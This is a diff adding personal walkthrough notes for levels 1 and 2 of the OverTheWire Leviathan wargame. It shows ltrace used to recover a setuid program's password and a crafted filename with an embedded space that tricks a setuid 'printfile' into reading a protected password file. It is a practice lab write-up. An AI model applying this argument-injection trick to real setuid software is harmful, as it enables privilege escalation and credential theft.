@@ -42,5 +42,38 @@ https://overthewire.org/wargames/leviathan/leviathan<level>.html
 
 `grep password ./backups/bookmarks.html`
 
+##### 1
+
+```bash
+# we have a setuid check program locally
+# check what's being called when check runs
+ltrace ./check
+# it wants a password which it does a strcmp against so we can just use the string it's comparing against then
+# it opens a new shell and we can
+cat /etc/leviathan_pass/leviathan_2
+```
+
+##### 2
+
+We have a `printfile` executable which is `setuid`. If we try something like `ltrace ./printfile .profile` we see
+that we first check if the file is readable before passing it to `cat` like `cat %s`. We can take advantage of the
+filename being passed in as is and the fact that it won't correctly intpret strings in the filename!
+
+```bash
+mkdir /tmp/andrewflbarnes2
+cd /tmp/andrewflbarnes2
+
+touch test
+mkdir -p 'test /etc/leviathan_pass/'
+touch 'test /etc/leviathan_pass/leviathan2'
+
+~/printfile 'test /etc/leviathan_pass/leviathan2'
+```
+
+When we run the final comman the `printfile` program checks if the full string is a readable file - it treats
+"`test `" as a directory rather than a file followed by a space.
+
+However when it is passed to the cat command it treats the space as if it is separating two files - so we end
+up catting the local `test` file and the actual file we want - `/etc/leviathan_pass/leviathan3` :)
 
 [1]: <https://overthewire.org/wargames/leviathan/> "Leviathan wargames landing page"
